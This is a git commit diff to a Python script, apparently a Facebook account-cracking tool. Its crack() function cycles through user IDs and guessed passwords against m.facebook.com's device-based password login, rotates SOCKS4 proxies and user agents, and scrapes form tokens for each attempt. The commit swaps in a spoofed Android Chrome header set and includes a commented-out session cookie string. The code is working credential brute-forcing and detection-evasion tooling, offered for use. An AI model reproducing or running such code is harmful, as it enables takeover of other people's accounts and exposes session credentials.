02d1d6e70c39b1c17188cfc5f46f99c7dbb1c81a
rawagaming <161049728+rawagaming@users.noreply.github.com>
2024-04-15 03:51:03 -0700

    Update lawa-mony.py

--- lawa-mony.py
+++ lawa-mony.py
@@ -693,7 +693,7 @@ def passwrd():
 def crack(idf,pwv):
     global loop,ok,cp
     bo = random.choice([m,k,h,b,u,x])
-    sys.stdout.write(f"\r {P}[RAWA]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+    sys.stdout.write(f"\r {P}[RAWAgu]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -702,7 +702,28 @@ def crack(idf,pwv):
         try:
             nip=random.choice(prox)
             proxs= {'http': 'socks4://'+nip}
-            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+            ses.headers.update({'authority': 'm.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'datr=25a8ZZRH1c5ViiGrbFgYISE3; sb=25a8Ze8reha5oWQ6EfZbFjJw; ps_n=0; ps_l=0; locale=ar_AR; vpd=v1%3B720x393x2.75; zsh=ASR4di5LR5HzrBp-zw3xJzr41bSD4Sc8wEPeIjuE-f8mF7BrEBdsCtN9LdJRkFRcPXpDzjfu9OjiBoGBSQ9dRBcJ4_trEK8vOanhPvOaRNIDh_eZlc3jlUdXhZBCt2W6CXhx0DurR-aB-1ahOKUfoZqWA2HZwPSMzRARk-c33H-JozZcOKWM7BtFPXg06A_8t-J3sHZXK2XxGynpgkAuh6t2wBIWEeVR9fAJwr97F0Pp6_UFVrstsfpkK_asHckhCLW4R0SRA3QOVp2wk1Z-BVomcSCzyfrmTl9k766CLTaa3knBABiaX0dYNR_Yp_fYnXiu; wl_cbv=v2%3Bclient_version%3A2401%3Btimestamp%3A1706870334; m_pixel_ratio=2.75; wd=393x720; fr=06vyUtMmdsqwTeBYB.AWWI_23nirSSxsQN6yplXXchjOU.BlvJbb.Le.AAA.0.0.BlvMZV.AWUm3cXSMMY',
+    'dpr': '2.75',
+    'referer': 'https://m.facebook.com/bookmarks/',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"Redmi Note 8 Pro"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"11.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '980',
+})
             p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
             dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
             koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
